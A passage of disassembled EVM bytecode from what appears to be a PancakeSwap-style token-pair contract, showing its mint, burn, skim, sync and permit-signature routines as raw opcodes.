EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF60 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF74 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF8A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFDD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xFF1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1007 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1026 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1043 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1051 DUP8 DUP8 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x108E JUMPI PUSH2 0x107A PUSH2 0x3E8 PUSH2 0xB60 PUSH2 0x1075 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH2 0x23B6 JUMP JUMPDEST SWAP9 POP PUSH2 0x1089 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2408 JUMP JUMPDEST PUSH2 0x10DD JUMP JUMPDEST PUSH2 0x10DA PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10AB DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x10B2 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10CD DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x10D4 JUMPI INVALID JUMPDEST DIV PUSH2 0x248C JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x111C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2771 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1126 DUP11 DUP11 PUSH2 0x2408 JUMP JUMPDEST PUSH2 0x1132 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1F76 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x1162 JUMPI PUSH1 0xB SLOAD PUSH2 0x115E SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1225 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1235 PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1291 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x12A5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x12BB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1309 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x131D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1333 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x1352 DUP9 DUP9 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1369 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x1370 JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x1384 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST DUP2 PUSH2 0x138B JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x139E JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x13D9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2708 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x13E3 ADDRESS DUP5 PUSH2 0x24A4 JUMP JUMPDEST PUSH2 0x13EE DUP8 DUP14 DUP14 PUSH2 0x1D29 JUMP JUMPDEST PUSH2 0x13F9 DUP7 DUP14 DUP13 PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x143F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1453 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1469 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14B5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x14C9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x14DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x14EF DUP6 DUP6 DUP12 DUP12 PUSH2 0x1F76 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x151F JUMPI PUSH1 0xB SLOAD PUSH2 0x151B SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x10 DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCD4 CALLER DUP5 DUP5 PUSH2 0x219B JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1619 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x16C8 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x16C3 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x168B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x169F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x16B5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST PUSH2 0x1D29 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x172F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x16C3 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x168B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0x10 SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x179F JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x18BA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x18F0 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1941 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x194C DUP10 DUP10 DUP10 PUSH2 0x2139 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x19A2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 DUP2 SWAP1 SSTORE DUP1 PUSH2 0x19B2 PUSH2 0xC9D JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1A06 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1A1A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1A30 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1A83 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1A97 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1AAD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1ACC DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1AE9 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1F26 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1AF7 DUP8 DUP8 PUSH2 0x2243 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1B30 JUMPI PUSH2 0x1B1B PUSH2 0x3E8 PUSH2 0xB60 PUSH2 0x1075 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1B2A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2530 JUMP JUMPDEST POP PUSH2 0x1B50 JUMP JUMPDEST PUSH2 0x1B4D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x10AB DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1EC3 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1B8F JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x26E0 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1B99 DUP11 DUP11 PUSH2 0x2530 JUMP JUMPDEST POP PUSH2 0x1132 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1F76 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0x10 SLOAD PUSH1 0x1 EQ PUSH2 0x1C12 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x10 SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1D22 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C63 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C77 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 